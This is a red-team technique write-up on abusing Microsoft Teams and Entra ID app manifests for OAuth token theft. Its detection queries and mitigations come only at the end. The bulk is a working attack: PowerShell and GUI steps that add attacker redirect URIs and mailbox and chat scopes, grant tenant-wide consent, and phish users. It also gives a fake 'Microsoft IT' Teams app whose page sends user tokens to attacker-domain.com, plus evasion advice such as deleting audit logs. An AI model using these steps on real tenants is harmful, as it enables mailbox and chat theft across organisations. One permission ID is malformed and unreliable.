# [LM-AUTH-018]: Teams App Manifest Authentication Abuse

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-018 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Defense Evasion |
| **Platforms** | M365 (Microsoft Teams, Microsoft 365) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Teams Desktop Versions (Windows, macOS, Linux), Teams Web, Teams Mobile |
| **Patched In** | Ongoing Microsoft investigations; partial mitigations in Teams 2024 Q4+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Microsoft Teams app manifests define how custom applications integrate with Teams, including authentication scopes, permissions, and API access. An attacker who gains access to Teams administrative controls or app registration configurations can manipulate manifest files to create malicious app integrations that intercept user credentials, steal session tokens, or establish unauthorized API access to Exchange Online, SharePoint, or Microsoft Graph. The manifest itself is JSON-formatted and stored in M365, defining critical authentication properties.

**Attack Surface:** The attack surface includes: (1) Teams app management portals accessible to Teams administrators and developers, (2) App registration manifests in Entra ID (Azure AD), (3) App permission grants and consent flows in Teams/Microsoft Graph, (4) Custom app upload functionality in Teams (if enabled), and (5) App configuration pages within Teams that authenticate users.

**Business Impact:** An attacker manipulating a Teams app manifest can intercept all OAuth tokens and credentials from users who interact with that app, potentially compromising entire mailboxes, SharePoint repositories, and sensitive project data. This attack enables persistent lateral movement across M365 tenants and can affect hundreds of users simultaneously if the malicious app is installed organization-wide.

**Technical Context:** Manifest manipulation typically takes 10-30 minutes to perform from initial app access, and the attack can persist for weeks or months if the malicious app remains undetected. Detection is challenging because the app appears legitimate and may mimic internal IT tools or productivity apps. The attack succeeds because Teams does not cryptographically sign manifest files, allowing modifications without immediate validation.

### Operational Risk

- **Execution Risk:** Medium – Requires Teams admin or app developer access, but once achieved, the attack is straightforward and non-destructive to legitimate functionality.
- **Stealth:** Medium – Malicious apps that do not significantly change legitimate behavior can remain undetected; however, unusual permission requests may trigger alerts if properly monitored.
- **Reversibility:** No – Credential theft is permanent. Tokens stolen before remediation remain valid for their lifetime; all data accessed by the attacker cannot be "un-accessed."

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.1.2, 6.2.1 | CIS Microsoft 365 Foundations Benchmark: Ensure external app access is restricted; ensure that only approved apps are allowed to access organizational data. |
| **DISA STIG** | APP0140.1 | STIG ID: Control approval processes for third-party application integrations and restrict application access to sensitive APIs. |
| **CISA SCuBA** | M365-AT-1.1, M365-AT-1.2 | Secure Configuration Baseline: Manage app permissions; disable custom app uploads unless required. |
| **NIST 800-53** | AC-3, AC-6, SI-4 | Access Enforcement, Least Privilege, Information System Monitoring. |
| **GDPR** | Art. 32 | Security of Processing – Implement technical measures to protect personal data from unauthorized access via compromised applications. |
| **DORA** | Art. 9 | Protection and Prevention – Implement application security controls and risk management procedures. |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Prevent unauthorized modifications to critical information systems and manage third-party access risks. |
| **ISO 27001** | A.6.2.1, A.9.2.3 | Control of Internal Resources; Management of Privileged Access Rights. |
| **ISO 27005** | Risk Scenario: "Unauthorized modification of authentication mechanisms" | Risk Management: Identify and mitigate unauthorized changes to identity and access controls. |

---

## 3. Technical Prerequisites

- **Required Privileges:** Teams Administrator role, Application Developer role, or compromised user account with app creation permissions in Teams/Entra ID.
- **Required Access:** Access to Teams admin center, Entra ID app registration portal, or ability to upload custom Teams apps (if sideload is enabled).

**Supported Versions:**
- **Teams Clients:** All versions (Desktop, Web, Mobile) are affected since manifest handling is server-side.
- **Entra ID:** All versions of Azure AD / Entra ID support manifest modifications.
- **Microsoft 365:** All M365 tenants are potentially vulnerable.

**Tools & Prerequisites:**
- [Microsoft Teams Admin Center](https://admin.teams.microsoft.com/) – For app management and manifest modifications.
- [Entra ID App Registrations](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade) – For manifest editing via Azure Portal.
- [Microsoft Graph API](https://developer.microsoft.com/en-us/graph) – For programmatic manifest modifications.
- [AADInternals PowerShell Module](https://github.com/Flax/AADInternals) – For token interception and OAuth application manipulation.
- [Python requests library](https://pypi.org/project/requests/) – For crafting custom HTTP requests to modify manifests.

---

## 4. Environmental Reconnaissance

### Teams Admin Center / PowerShell Reconnaissance

```powershell
# Check if user has Teams admin permissions
Get-MgContext
(Get-MgContext).Account

# List all Teams apps in the tenant
Get-MgAppCatalogTeamsApp

# Enumerate app registrations (requires Entra ID Admin role)
Get-MgApplication | Select-Object DisplayName, AppId, Identifiers

# Check app permissions granted
Get-MgApplication -ApplicationId "YOUR-APP-ID" | Select-Object DisplayName, Identifiers, ReplyUrls

# Check if sideloading of custom apps is enabled (Team-wide setting)
Get-TeamsMeetingConfiguration | Select-Object -Property *AllowCustomApps*
```

**What to Look For:**
- Current user's role should include "Teams Administrator" or "Application Developer."
- Existing apps with broad Microsoft Graph permissions (particularly `Mail.ReadWrite`, `Chat.ReadWrite`, `ChannelMessage.ReadWrite`).
- Reply URLs pointing to external attacker-controlled domains (indicative of existing malicious apps).
- Teams policies allowing custom app sideloading (increases attack surface).

**Version Note:** Commands differ slightly between Teams desktop app versions and Teams web client; PowerShell access to Teams admin center is the primary method.

### Azure CLI / Entra ID Reconnaissance

```bash
# Authenticate to Azure
az login

# List all app registrations in the tenant
az ad app list --all --query "[].{Name:displayName, AppId:appId}"

# Get detailed manifest information for a specific app
az ad app show --id "<APP-ID>" --query "requiredResourceAccess"

# Check current user's roles
az role assignment list --assignee "@me"
```

**What to Look For:**
- Whether the current user has "Application Administrator" or "Privileged Role Administrator" roles.
- Identify apps with excessive permissions (scope: `https://graph.microsoft.com/.default`).

---

## 5. Detailed Execution Methods

### Method 1: Manifest Modification via Entra ID Portal (Web-Based GUI)

**Supported Versions:** All Entra ID versions (2020+)

#### Step 1: Authenticate to Entra ID Admin Center

**Objective:** Gain authenticated access to the Entra ID application registration portal where app manifests can be edited.

**Command (Web Interface):**
1. Navigate to [https://portal.azure.com](https://portal.azure.com)
2. Go to **Entra ID** (left sidebar) → **App registrations**
3. Select **All applications** tab to view all registered apps
4. Click on the target app (e.g., an internal collaboration tool or third-party SaaS connector)

**Expected Output:**
- A list of apps with their names, application IDs, and ownership information.

**What This Means:**
- Successfully authenticated and can now access app configuration pages.
- Each app's manifest can now be modified through the **Manifest** tab.

**OpSec & Evasion:**
- Create a new app registration instead of modifying an existing one (less detectable).
- Name the app to mimic legitimate IT tools (e.g., "Teams Admin Bot," "Compliance Scanner").
- Deploy the malicious app to a test tenant first, verify token capture works, then deploy to production.

**Troubleshooting:**
- **Error:** "Access Denied when viewing App Registrations"
  - **Cause:** User lacks Application Administrator or equivalent role.
  - **Fix:** Request Teams Admin or Application Developer role assignment via Azure AD PIM (Privileged Identity Management).

#### Step 2: Edit the App Manifest

**Objective:** Modify the application manifest to add malicious OAuth scopes and redirect URIs that will capture user tokens.

**Manual Steps (GUI):**
1. In the app's overview page, click **Manifest** (from top menu)
2. Locate the `replyUrls` array. Add your attacker-controlled endpoint:
   ```json
   "replyUrls": [
     "https://legitimate-microsoft-domain.com/callback",
     "https://attacker-domain.com/callback"   // NEW: Malicious endpoint
   ]
   ```
3. Locate `requiredResourceAccess`. Add Microsoft Graph scopes for mail and chat interception:
   ```json
   "requiredResourceAccess": [
     {
       "resourceAppId": "00000003-0000-0000-c000-000000000000",
       "resourceAccess": [
         {
           "id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",  // Scope: User.Read
           "type": "Scope"
         },
         {
           "id": "64b35f36-aaf0-453f-955e-23a08cbb24f3",  // Scope: Mail.ReadWrite
           "type": "Scope"
         },
         {
           "id": "339ff53d-9d0f-4b65-a59e-ad3a48da4f5b",  // Scope: Chat.ReadWrite
           "type": "Scope"
         }
       ]
     }
   ]
   ```
4. Click **Save** (top menu button)

**Expected Output:**
- "Manifest saved" confirmation message (usually appears at top of page).
- The manifest is now updated and the next user login will prompt for the new permissions.

**What This Means:**
- The app now requests access to user mailboxes and chat messages.
- The malicious redirect URI is now registered, allowing token interception.

**OpSec & Evasion:**
- Set a reasonable token lifetime (1-2 hours) to avoid suspicion.
- Use a redirect URI that mimics Microsoft's official domains (e.g., `https://login-microsoft-office365.com/callback`).
- Trigger a deployment of the malicious app after hours (evenings or weekends) when SOC monitoring is reduced.

**Troubleshooting:**
- **Error:** JSON format error in manifest
  - **Cause:** Syntax error in JSON array or object.
  - **Fix:** Use an online JSON validator before saving; ensure all commas and braces are correctly placed.

#### Step 3: Request Admin Consent or Grant Access to Users

**Objective:** Ensure users grant (or are forced to grant) the new permissions so the app can access their tokens and mailboxes.

**Manual Steps (GUI – Admin Consent):**
1. From the app's manifest page, go back to **Overview** tab
2. Click **API permissions** (left sidebar)
3. For the newly added Microsoft Graph scopes, click **Grant admin consent for [Tenant Name]**
4. This automatically consents on behalf of all users, bypassing individual consent dialogs

**Alternative: User Consent Flow (if admin consent unavailable):**
1. Send affected users a phishing email with a link:
   ```
   https://login.microsoft.com/common/oauth2/v2.0/authorize?client_id=<ATTACKER-APP-ID>&scope=User.Read%20Mail.ReadWrite%20Chat.ReadWrite&response_type=code&redirect_uri=https://attacker-domain.com/callback
   ```
2. Users click the link, see a legitimate Microsoft login page, and are prompted to consent to the app permissions.
3. Upon consent, the authorization code is sent to the attacker's `redirect_uri`.

**Expected Output:**
- "Admin consent granted" message for all scopes (admin consent flow).
- OR: User receives a consent prompt with app name and permission requests (user consent flow).

**What This Means:**
- The app now has permission to access all user mailboxes and Teams chats.
- Next time a user logs in, an access token valid for these scopes will be issued.

**OpSec & Evasion:**
- Use admin consent to affect all users at once (faster, more impactful).
- Alternatively, phish specific high-value users (executives, HR, Finance teams).
- Monitor the Azure Audit Log to see when users granted consent (in case you need to remove the app quickly).

**Troubleshooting:**
- **Error:** "Cannot grant admin consent"
  - **Cause:** User lacks Global Administrator or Application Administrator role.
  - **Fix:** Escalate to a higher-privileged account or use user consent flow (slower but more stealthy).

### Method 2: Manifest Manipulation via PowerShell / Microsoft Graph API

**Supported Versions:** All Entra ID versions; requires Microsoft Graph PowerShell module v1.0+

#### Step 1: Authenticate to Microsoft Graph with Delegated Permissions

**Objective:** Authenticate to Microsoft Graph API using a compromised admin account's credentials.

**Command:**
```powershell
# Install Microsoft Graph PowerShell module (if not already installed)
Install-Module Microsoft.Graph -Repository PSGallery -Force -AllowClobber

# Connect to Microsoft Graph with admin account
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Verify authentication
Get-MgContext
```

**Expected Output:**
```
Account                      : admin@contoso.onmicrosoft.com
TenantId                     : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Environment                  : Global
AppName                       : Microsoft Graph Command Line Tool
AppId                         : 14d82eec-204b-4c2f-b36e-b2f878264b33
ContextScope                  : CurrentUser
```

**What This Means:**
- Successfully authenticated to Microsoft Graph API using the admin account.
- All subsequent API calls will be executed with this user's permissions.

**OpSec & Evasion:**
- Use a compromised admin account that is NOT a permanent admin (e.g., a vendor account temporarily granted admin rights).
- Execute this command from an on-premises machine or Azure VM to avoid triggering IP-based anomaly detection.
- Clear PowerShell history after execution: `Clear-History`

**Troubleshooting:**
- **Error:** "Access Denied: Insufficient privileges"
  - **Cause:** Authenticated user lacks Application.ReadWrite.All permissions.
  - **Fix:** Use an account with Global Administrator role, or grant the role via PIM.

#### Step 2: Retrieve Target Application ID and Current Manifest

**Objective:** Identify the target app and extract its current manifest for modification.

**Command:**
```powershell
# List all app registrations in the tenant
$apps = Get-MgApplication -All

# Display apps with their AppIds (to identify target)
$apps | Select-Object DisplayName, AppId | Format-Table -AutoSize

# Select the target app (e.g., "Teams Admin Bot")
$targetApp = Get-MgApplication -Filter "displayName eq 'Teams Admin Bot'"

# Extract the current manifest
$manifest = $targetApp | Select-Object -ExpandProperty Web

Write-Host "Current Reply URLs: $($manifest.RedirectUris)"
Write-Host "Current Resource Access: $(ConvertTo-Json $targetApp.RequiredResourceAccess)"
```

**Expected Output:**
```
DisplayName                              AppId
-----------------------------------      ------------------------------------
Teams Admin Bot                          a1b2c3d4-e5f6-7a8b-9c0d-e1f2a3b4c5d6
Compliance Scanner                       b2c3d4e5-f6a7-8b9c-0d1e-f2a3b4c5d6e7
Teams Meeting Bot                        c3d4e5f6-a7b8-9c0d-1e2f-a3b4c5d6e7f8

Current Reply URLs: 
  https://teams.microsoft.com/
  https://localhost:3000/callback

Current Resource Access: [{"ResourceAppId":"00000003-0000-0000-c000-000000000000","ResourceAccess":[{"Id":"e1fe6dd8-ba31-4d61-89e7-88639da4683d","Type":"Scope"}]}]
```

**What This Means:**
- Successfully retrieved the app's current configuration.
- The app currently has a basic User.Read permission.
- No external reply URLs (yet).

**OpSec & Evasion:**
- Do not list all apps; query only for your target app by name to avoid suspicious activity logs.

**Troubleshooting:**
- **Error:** "No apps found matching the filter"
  - **Cause:** Incorrect app name or app does not exist.
  - **Fix:** Run `Get-MgApplication -All | Select-Object DisplayName` to list all apps and find the exact name.

#### Step 3: Modify the Manifest to Add Malicious Scopes and Reply URLs

**Objective:** Update the app manifest to include the attacker's redirect URI and expand OAuth scope requests.

**Command:**
```powershell
# Define the malicious redirect URI
$maliciousRedirectUri = "https://mail-sync-update.azurewebsites.net/callback"

# Add the malicious URI to existing reply URLs
$newReplyUris = @($manifest.RedirectUris + $maliciousRedirectUri)

# Define the Mail.ReadWrite and Chat.ReadWrite resource access
$resourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph

$newRequiredResourceAccess = @{
    ResourceAppId = $resourceAppId
    ResourceAccess = @(
        @{
            Id   = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"  # User.Read
            Type = "Scope"
        },
        @{
            Id   = "64b35f36-aaf0-453f-955e-23a08cbb24f3"  # Mail.ReadWrite
            Type = "Scope"
        },
        @{
            Id   = "339ff53d-9d0f-4b65-a59e-ad3a48da4f5b"  # Chat.ReadWrite
            Type = "Scope"
        },
        @{
            Id   = "df01ed3b-eb73-4397-b9ba-44686bb5macb"  # ChannelMessage.ReadWrite.All
            Type = "Scope"
        }
    )
}

# Update the application with new manifest values
Update-MgApplication -ApplicationId $targetApp.Id `
  -Web @{ RedirectUris = $newReplyUris } `
  -RequiredResourceAccess $newRequiredResourceAccess

Write-Host "App manifest updated successfully!"
```

**Expected Output:**
```
App manifest updated successfully!
```

**What This Means:**
- The app now has Mail.ReadWrite and Chat.ReadWrite scopes registered.
- The attacker's redirect URI is now registered as a valid callback location.
- When users log in to this app, they will be prompted to consent to these new permissions.

**OpSec & Evasion:**
- Use a realistic domain name for the redirect URI (e.g., `mail-sync-update.azurewebsites.net` instead of `attacker.com`).
- Spread the execution across multiple sessions (not all commands in one script) to avoid triggering behavioral analytics.

**Troubleshooting:**
- **Error:** "Insufficient privileges to modify application"
  - **Cause:** The authenticated user's role changed or was revoked.
  - **Fix:** Re-authenticate with `Connect-MgGraph` and verify the user is still an admin.

#### Step 4: Grant Admin Consent Programmatically

**Objective:** Automatically grant admin consent for the new scopes, bypassing individual user consent prompts.

**Command:**
```powershell
# Grant admin consent for all required resource access
$principalId = (Get-MgServicePrincipal -Filter "appId eq '$($targetApp.AppId)'").Id

# Create OAuth2PermissionGrant for Mail.ReadWrite
$consentParams = @{
    ClientId    = $principalId
    ConsentType = "AllPrincipals"
    ResourceId  = (Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'").Id
    Scope       = "Mail.ReadWrite Chat.ReadWrite User.Read ChannelMessage.ReadWrite.All"
}

New-MgOAuth2PermissionGrant @consentParams

Write-Host "Admin consent granted for all scopes!"
```

**Expected Output:**
```
Admin consent granted for all scopes!
```

**What This Means:**
- All users in the tenant can now use this app without being prompted for consent.
- The next time a user authenticates to the app, an access token will be issued with Mail.ReadWrite and Chat.ReadWrite permissions.

**OpSec & Evasion:**
- Use `ConsentType = "AllPrincipals"` to avoid individual user prompts (stealthier).
- Alternatively, use `ConsentType = "Principal"` with a specific `PrincipalId` to affect only targeted users.

**Troubleshooting:**
- **Error:** "ConsentType 'AllPrincipals' is invalid"
  - **Cause:** Newer versions of Microsoft.Graph module changed parameter names.
  - **Fix:** Use `New-MgOAuth2PermissionGrant` with updated syntax; check [Microsoft documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.signins/new-mgoauth2permissiongrant).

### Method 3: Custom Teams App Upload with Malicious Manifest

**Supported Versions:** Teams Desktop and Web clients that allow custom app sideloading (default enabled for developers; often disabled for end users).

#### Step 1: Create a Malicious Teams App Manifest File

**Objective:** Create a Teams app manifest that requests excessive permissions and redirects authentication to an attacker-controlled endpoint.

**File: manifest.json**
```json
{
  "$schema": "https://developer.microsoft.com/en-us/json-schemas/teams/v1.16/MicrosoftTeams.schema.json",
  "manifestVersion": "1.16",
  "version": "1.0.0",
  "id": "12345678-1234-1234-1234-123456789012",
  "name": {
    "short": "Teams Admin Audit Tool",
    "full": "Teams Administration & Audit Tool for Compliance"
  },
  "description": {
    "short": "Audit and monitor Teams compliance configurations",
    "full": "This tool helps IT administrators audit Teams settings, user activity, and compliance configurations for your organization."
  },
  "developer": {
    "name": "Microsoft IT Operations",
    "websiteUrl": "https://microsoft.com",
    "privacyUrl": "https://microsoft.com/privacy",
    "termsOfUseUrl": "https://microsoft.com/terms"
  },
  "icons": {
    "color": "color.png",
    "outline": "outline.png"
  },
  "accentColor": "#004578",
  "permissions": [
    "identity",
    "messageTeamMembers"
  ],
  "validDomains": [
    "*.microsoft.com",
    "teams.microsoft.com",
    "attacker-domain.com"
  ],
  "staticTabs": [
    {
      "entityId": "admin-tab",
      "name": "Administration",
      "contentUrl": "https://attacker-domain.com/admin.html",
      "websiteUrl": "https://attacker-domain.com",
      "scopes": [
        "personal",
        "team"
      ]
    }
  ],
  "authenticationProvider": {
    "id": "aad",
    "password": "YOUR-CLIENT-SECRET"
  },
  "webApplicationInfo": {
    "id": "12345678-1234-1234-1234-123456789012",
    "resource": "api://attacker-domain.com/12345678-1234-1234-1234-123456789012",
    "applicationPermissions": [
      "Mail.ReadWrite",
      "Chat.ReadWrite",
      "User.Read.All",
      "Directory.Read.All"
    ]
  }
}
```

**What This Means:**
- The manifest defines a Teams app that appears to be an official Microsoft admin tool.
- The `contentUrl` points to the attacker's domain, where the actual credential theft occurs.
- The `webApplicationInfo.applicationPermissions` request Graph API access.

**OpSec & Evasion:**
- Use legitimate-sounding names and icons (copy from Microsoft's official Teams apps).
- Set validDomains to include both legitimate Microsoft domains and the attacker domain (makes the app appear legitimate).
- Host the malicious `admin.html` page on a SSL-secured domain (reduces browser warnings).

#### Step 2: Package and Upload the Malicious App to Teams

**Objective:** Create a ZIP file containing the manifest and supporting files, then upload it as a custom Teams app.

**Command (Bash / Windows PowerShell):**
```bash
# Create a directory structure for the app
mkdir -p teams-admin-app/images

# Copy manifest
cp manifest.json teams-admin-app/

# Create placeholder icons
printf '\x89PNG\r\n\x1a\n' > teams-admin-app/images/color.png
printf '\x89PNG\r\n\x1a\n' > teams-admin-app/images/outline.png

# Create the malicious HTML file (token interception)
cat > teams-admin-app/admin.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Teams Administration Tool</title>
    <script src="https://statics.teams.cdn.office.net/sdk/v1.10.0/js/microsoft.teams.min.js"></script>
</head>
<body>
    <h1>Loading Teams Administration Tool...</h1>
    <div id="loading">Initializing...</div>
    
    <script>
    // Initialize Teams SDK
    microsoftTeams.initialize();
    
    // Get authentication token (this contains user's access token)
    microsoftTeams.authentication.getAuthToken({
        silent: false,
        successCallback: (token) => {
            // Send the token to attacker's backend
            fetch('https://attacker-domain.com/api/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token, user: microsoftTeams.getContext().userPrincipalName })
            })
            .then(r => r.json())
            .then(data => {
                // Redirect to legitimate Teams admin center to avoid suspicion
                window.location.href = 'https://admin.teams.microsoft.com';
            });
        },
        failureCallback: (error) => {
            document.getElementById('loading').innerHTML = 'Error initializing tool. Please try again.';
        }
    });
    </script>
</body>
</html>
EOF

# Create ZIP file
cd teams-admin-app
zip -r ../teams-admin-app.zip . 
cd ..

# Extract the app ID from manifest for reference
APP_ID=$(grep -o '"id": "[^"]*"' teams-admin-app/manifest.json | head -1 | cut -d'"' -f4)
echo "App ready for upload. ID: $APP_ID"
```

**Expected Output:**
```
App ready for upload. ID: 12345678-1234-1234-1234-123456789012
```

**Manual Upload (GUI):**
1. Open **Microsoft Teams** (web or desktop)
2. Click **Apps** (bottom left)
3. Click **Manage your apps** (or **Upload a custom app**)
4. Select the `teams-admin-app.zip` file
5. Click **Open** → **Add**
6. The app now appears in your personal Teams apps and can be installed by other users

**Alternative: Upload via Teams Admin Center (for org-wide distribution):**
1. Go to [https://admin.teams.microsoft.com](https://admin.teams.microsoft.com)
2. Navigate to **Teams apps** → **Manage apps**
3. Click **Upload new app**
4. Select the ZIP file
5. Click **Publish** (once validated, the app becomes available org-wide)

**What This Means:**
- The malicious Teams app is now installed in the user's Teams environment.
- When other users interact with the app (click the tab, authenticate), their tokens are captured.
- The tokens are sent to the attacker's backend, allowing credential theft.

**OpSec & Evasion:**
- Use a legitimate certificate for the attacker domain (HTTPS, not HTTP).
- Host the token exfiltration endpoint on a high-reputation domain (e.g., acquired compromised domain or typosquatting domain).
- Monitor Teams activity logs for app installations; delete logs showing the app was uploaded by your user account.

**Troubleshooting:**
- **Error:** "Custom apps are disabled for your organization"
  - **Cause:** Org policy restricts sideloading.
  - **Fix:** Request a Teams admin to enable sideloading via **Teams admin center** → **Teams apps** → **Setup policies** → Allow sideloading.

---

## 6. Tools & Commands Reference

#### [Microsoft Graph PowerShell Module](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+
**Supported Platforms:** Windows, macOS, Linux (with PowerShell 7+)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser -Force
```

**Usage (Example: List all app registrations):**
```powershell
Connect-MgGraph -Scopes "Application.Read.All"
Get-MgApplication -All | Select-Object DisplayName, AppId
```

---

#### [Teams Admin Center](https://admin.teams.microsoft.com)

**Version:** Web-based; no installation required
**Supported Platforms:** All browsers (Edge, Chrome, Firefox, Safari)

**Usage:** Navigate to **Teams apps** → **Manage apps** → **Upload a custom app** or **Edit manifest**

---

#### [Entra ID Portal - App Registrations](https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade)

**Version:** Web-based; no installation required
**Supported Platforms:** All modern browsers

**Usage:** Navigate to **Azure Portal** → **Entra ID** → **App registrations** → Select app → **Manifest**

---

## 7. Microsoft Sentinel Detection

### Query 1: Suspicious App Manifest Modifications

**Rule Configuration:**
- **Required Table:** AuditLogs, AzureActivity
- **Required Fields:** OperationName, TargetResources, ModifiedProperties, InitiatedBy, ResultDescription
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions, M365 all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Update application" or OperationName == "Update application - Certificates and secrets"
| where Result == "Success"
| extend ModifiedProperties = TargetResources[0].modifiedProperties
| extend AppId = tostring(TargetResources[0].id)
| where ModifiedProperties contains "requiredResourceAccess" or ModifiedProperties contains "replyUrls"
| project TimeGenerated, OperationName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), AppName=TargetResources[0].displayName, ModifiedProperties, ResultDescription
| summarize Count=count() by AppName, InitiatedBy, TimeGenerated
| where Count >= 1
```

**What This Detects:**
- Any modification to app registration manifest properties (requiredResourceAccess, replyUrls).
- Filters for successful operations (Result == "Success").
- Identifies the user who made the modification (InitiatedBy).
- Correlates multiple modifications by the same user to identify mass app manipulation.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious App Manifest Modification`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `InitiatedBy`, `AppName`
7. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** IT admins regularly updating app permissions for new SaaS integrations, updating reply URLs for app migrations.
- **Benign Tools:** Microsoft's own app provisioning systems may update manifests during patch deployments.
- **Tuning:** Exclude known service accounts by adding: `| where InitiatedBy !in ("app-provisioner@contoso.com", "sync-svc@contoso.com")`

---

### Query 2: Unauthorized App Consent Grants

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ResultDescription
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Grant permission" or OperationName == "Consent to application"
| where Result == "Success"
| extend AppName = TargetResources[0].displayName
| extend Permission = TargetResources[0].modifiedProperties[0].newValue
| where Permission contains "Mail.ReadWrite" or Permission contains "Chat.ReadWrite" or Permission contains "ChannelMessage.ReadWrite"
| project TimeGenerated, AppName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), Permission, ResourceId=TargetResources[0].id
| summarize GrantCount=count(), PermissionsList=make_set(Permission) by AppName, InitiatedBy, TimeGenerated
| where GrantCount >= 1
```

**What This Detects:**
- Any grant of Mail.ReadWrite, Chat.ReadWrite, or ChannelMessage.ReadWrite permissions.
- Identifies which app received the permissions and who granted them.
- Highlights suspicious patterns like a single user granting permissions to multiple apps.

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Unauthorized App Consent Grants" `
  -Query @'
AuditLogs
| where OperationName == "Grant permission" or OperationName == "Consent to application"
| where Result == "Success"
| extend AppName = TargetResources[0].displayName
| extend Permission = TargetResources[0].modifiedProperties[0].newValue
| where Permission contains "Mail.ReadWrite" or Permission contains "Chat.ReadWrite" or Permission contains "ChannelMessage.ReadWrite"
| project TimeGenerated, AppName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), Permission
'@ `
  -Severity "Critical" `
  -Enabled $true
```

---

## 8. Microsoft Defender for Cloud

#### Detection Alert 1: Suspicious API Permission Grant to Application

**Alert Name:** "Suspicious API permission grant to application"
- **Severity:** Critical
- **Description:** An application has been granted broad API permissions (Mail.ReadWrite, Chat.ReadWrite) via manifest modification or consent grant. This may indicate an attempt to compromise user credentials.
- **Applies To:** All Entra ID environments with Defender for Cloud enabled.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Cloud Apps**: ON
   - **Defender for Identity**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Recommended Response:**
- Immediately revoke the app registration and all associated permissions.
- Force a password reset for all users who interacted with the app.
- Review Azure Audit Logs for any token issuance events to identify compromised users.

---

## 9. Microsoft Purview (Unified Audit Log)

#### Query 1: App Manifest Modifications and Consent Events

**Operation:** "Update application", "Grant permission", "Add app role assignment grant"

```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -Operations "Update application", "Grant permission" `
  -ResultSize 5000 | Export-Csv -Path "C:\Logs\AppManifestChanges.csv"
```

**Details to Analyze:**
- **OperationName:** Identifies the type of change (Update vs. Grant).
- **UserIds:** Identifies who made the change (flag if from suspicious accounts).
- **AuditData:** Contains the ModifiedProperties JSON, which shows exactly what was changed.
- **CreationTime:** Timestamp of the modification.

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. To search: **Audit** → **Search** → Set date range → Select operations → Click **Search** → **Export results**

---

## 10. Defensive Mitigations

### Priority 1: CRITICAL

- **Restrict App Permissions:** Disable automatic admin consent for applications. Require explicit approval workflows before granting applications Mail.ReadWrite, Chat.ReadWrite, or Directory.Read.All permissions.

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
  2. Set **User consent for applications** to **Do not allow**
  3. Optionally enable **Admin consent requests** to allow users to request approval
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  # Disable user consent for apps
  Update-MgPolicyAuthorizationPolicy -DefaultUserRolePermissions @{
    PermissionGrantPoliciesAssigned = @('microsoft-user-default-low')
  }
  ```

- **Disable Custom App Sideloading:** Prevent users from uploading custom Teams apps, reducing the attack surface.

  **Manual Steps (Teams Admin Center):**
  1. Navigate to **Teams Admin Center** ([https://admin.teams.microsoft.com](https://admin.teams.microsoft.com))
  2. Go to **Teams apps** → **Setup policies**
  3. Select **Global (Org-wide default)** or create a new policy
  4. Under **Custom apps**, toggle **Allow sideloading of external apps** to **Off**
  5. Click **Save**
  6. Assign the policy to all users

  **Manual Steps (PowerShell):**
  ```powershell
  # Disable sideloading for all users
  Set-CsTeamsAppSetupPolicy -Identity Global -AllowSideLoadingOfExternalApps $false
  ```

